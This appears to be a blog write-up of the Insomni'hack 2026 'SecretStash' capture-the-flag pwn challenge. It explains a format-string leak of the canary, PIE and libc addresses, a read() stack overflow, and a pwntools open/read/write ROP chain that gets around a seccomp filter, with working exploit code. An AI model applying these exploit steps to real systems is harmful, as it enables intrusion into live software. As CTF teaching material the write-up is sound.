---
layout: post
title: "Insomni'hack 2026 - SecretStash"
date: 2026-03-25 12:00:00 +0100
description: "Format String Leak, Stack Overflow, and ROP Chain to Read the Flag"
categories: [ctf]
tags: [insomnihack, pwn, rop, format-string, stack-overflow, seccomp, binary-exploitation]
toc: true
math: false
mermaid: false
image:
  path: /assets/img/insomnihack/insomnihack.png
  alt: Insomni'hack 2026
---
# SecretStash

- **Challenge author:** Insomni'hack 2026 
- **Category:** pwn, shellcoding
- **Description:** Trust us with your passwords and try our new Password Manager, remembers everything for you! `secretstash.insomnihack.ch:6666` 
- **Provided files:** `secretstash.bin`, `Dockerfile`

---
## Analysis & Preparation

Running `checksec` on the binary:
![checksec response](/assets/img/insomnihack/SecretStash_checksec.png)
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

Pretty much every mitigation is on, so this isn’t just “smash RIP and win”.

Canary -> we need a leak before touching the return address.  
PIE -> need a code pointer leak for a base.  
NX -> no shellcode, so this is ROP.

The Dockerfile uses `ubuntu:20.04`. I built the container, ran it, and copied out `libc.so.6` directly. This matters because `pwntools` needs the exact libc binary to resolve symbol offsets correctly. Using a different version would give you wrong addresses and a broken exploit.

---
## Reverse Engineering

The binary is a simple password manager with four menu options: add entry, view all, search by site, and exit. After poking around in Ghidra for a bit, a few things stand out.

### Login

The login prompt reads a username and password. The password check is straightforward. There's a pointer in `.data` that points to the string `"admin"` in `.rodata`, and it's compared with `strcmp`. One funny detail: the `fopen("passwords.txt", "w")` in the init function truncates the entries file on every connection, but it doesn't touch the login password at all. The password is always `admin`.

The username handling is where things get interesting. After reading it, the binary calls `printf` with the username directly as the format string:
```c
printf("\nCheck ");
printf(username);   // format string vuln
puts(" account");
```

So yeah, straight-up format string. We can pass `%p` specifiers and read values off the stack. Since the password check happens after this print (and the password is always `admin`), we can leak everything and still login in the same connection.

### The Stack Overflow

Three of the four entry fields (site name, username, password) use `read_input()`, a wrapper around `fgets` with a sane size limit. The description field is different:
```c
read(0, buf, 0x1000);  // buf is only 64 bytes!
```

The buffer is only 64 bytes but `read()` happily accepts up to 4096. To find the exact offset, I just threw a cyclic pattern at it and checked where things landed. The canary sits at a fixed offset from the buffer start, followed by the saved `rbp` and the return address.

### Seccomp 

The binary sets up a seccomp filter with `SCMP_ACT_KILL` as the default action, meaning any syscall not on the whitelist kills the process immediately. The allowed syscalls are:

| NR  | Syscall    |
| --- | ---------- |
| 0   | read       |
| 1   | write      |
| 2   | open       |
| 3   | close      |
| 5   | fstat      |
| 8   | lseek      |
| 9   | mmap       |
| 11  | munmap     |
| 12  | brk        |
| 60  | exit       |
| 231 | exit_group |
| 257 | openat     |
| 262 | newfstatat |

Notably `execve` is blocked, so no shell. But `open`, `read`, and `write` are allowed, which is all we need: `open` -> `read` -> `write` the flag.

---
## Exploitation

### Leaking Canary, PIE, and Libc

Instead of doing multiple connections, the format string gives everything in one go. I sent: `%p|%8$p|%9$p|%43$p` as the username and `admin` as the password. This leaks:
- `%p` -> a stack pointer we reuse as a scratch buffer 
- `%8$p` -> pointer into the binary at offset `0x1340` from the PIE base aka. the entrypoint
- `%9$p` -> the stack canary (ends in `\x00`) 
- `%43$p` -> libc pointer at offset `0x22630`

I found these positions by just spamming `%p|` around 50 times and scanning the output. Takes a bit of eyeballing, but once you know the prefixes it’s pretty easy:
- stack → `0x7fff`
- PIE → `0x55` / `0x56`
- libc → `0x7f` (but different region than stack)

The output looks like:
```
Check 0xSTACK|0xPIEPTR|0xCANARY|0xLIBCPTR account
**# Welcome to SecretStash 🔐 #**
...
````

> Four leaks, one connection, still authenticated and into the menu.

### Building the ROP Chain
I originally planned to just ret2libc `system("/bin/sh")`, but seccomp kills that immediately. So we go with open/read/write.

With everything known, I let `pwntools` do most of the work for the gadget hunting:
```python
exe  = ELF("./secretstash")
libc = ELF("./libc.so.6")

exe.address  = pie_leak - 0x1340
libc.address = libc_leak - 0x22630

rop = ROP([exe, libc], stack + len(pad))
rop.call(libc.symbols['open'],  [b"flag", 0])
rop.call(libc.symbols['read'],  [3, stack, 0x100])
rop.call(libc.symbols['write'], [1, stack, 0x100])
rop.call(libc.symbols['exit'],  [0])
```

A couple details here matter: The second argument to `ROP()` is the runtime address where the chain will live, so passing `stack + len(pad)` tells `pwntools` to resolve any internal references relative to that address. The stack address leaked from `%p` is used directly as the read/write scratch buffer, which is a neat trick since we already know it exactly. File descriptor 3 is used for the flag file because 0, 1, and 2 are stdin/stdout/stderr, and the process hasn't opened anything else by the time our chain runs. The `exit(0)` at the end is a clean way to terminate after the flag is written out.

I did try `fopen()` first. It crashed every time. Turns out it internally calls `stat()` (blocked by seccomp) and may hit `malloc()` -> `mprotect()` depending on heap state. Took a bit to realize the ROP chain wasn’t wrong but the libc wrapper was the problem.

The raw `open()` wrapper is just a syscall, so no surprises.

### Sending the Payload

```python
pad = b"A" * cyclic_find(0x6161616161616168, n=8) 
pad += p64(canary) 
pad += b"A" * cyclic_find(b"baaaaaaa", n=8) 

put_payload(r, pad + rop.chain() + b"A" * 0x100)
```

The cyclic pattern gives the exact offsets without digging through disassembly. This goes into the description field when adding an entry. The binary prints "Entry saved successfully." and once the function returns, execution drops straight into the ROP chain.

```
[+] Flag: INS{0ne_Gadget?Nah_Just_op3n_r3ad_wr1te_1nto_sh3llc0d3}
```

---

## Key Takeaways

**Get the local environment right first.** Pulling the correct `libc.so.6` from the container matters. Wrong libc = wrong offsets.

**Format strings leak everything.** One good format string is enough to grab canary, PIE, and libc in one shot.

**Use `open()` not `fopen()`.** The `fopen()` wrapper pulls in extra syscalls (`stat`, `malloc`) that break under seccomp. `open()` doesn’t.

**Let pwntools handle the boring parts.** `ROP([exe, libc])` finds the gadgets and handles alignment. No reason to do that manually.
